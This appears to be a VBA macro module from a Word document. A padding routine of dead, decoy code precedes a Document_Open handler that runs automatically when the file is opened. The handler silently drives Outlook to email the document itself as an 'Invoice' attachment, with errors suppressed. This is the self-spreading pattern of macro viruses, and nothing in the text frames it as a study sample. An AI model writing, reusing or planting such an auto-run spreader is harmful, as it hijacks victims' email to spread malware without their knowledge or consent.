
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    Set olApp = CreateObject("Outlook.Application")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "recipient@example.com"
    olMail.Subject = "Invoice"
    olMail.Body = "Please find the attached document."
    olMail.Attachments.Add ActiveDocument.FullName
    olMail.Send
End Sub
